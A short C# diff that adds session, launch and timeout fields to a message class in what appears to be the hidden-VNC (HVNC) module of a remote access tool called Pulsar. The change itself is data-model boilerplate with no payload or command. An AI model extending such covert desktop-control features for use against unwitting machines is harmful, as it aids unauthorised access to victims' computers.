@@ -21,5 +21,14 @@ namespace Pulsar.Common.Messages.Monitoring.HVNC
         public string CustomSearchPattern { get; set; }
         [Key(7)]
         public string CustomReplacementPath { get; set; }
+
+        [Key(8)]
+        public string SessionId { get; set; } = string.Empty;
+
+        [Key(9)]
+        public string LaunchId { get; set; } = string.Empty;
+
+        [Key(10)]
+        public int TimeoutMs { get; set; } = 30000;
     }
 }
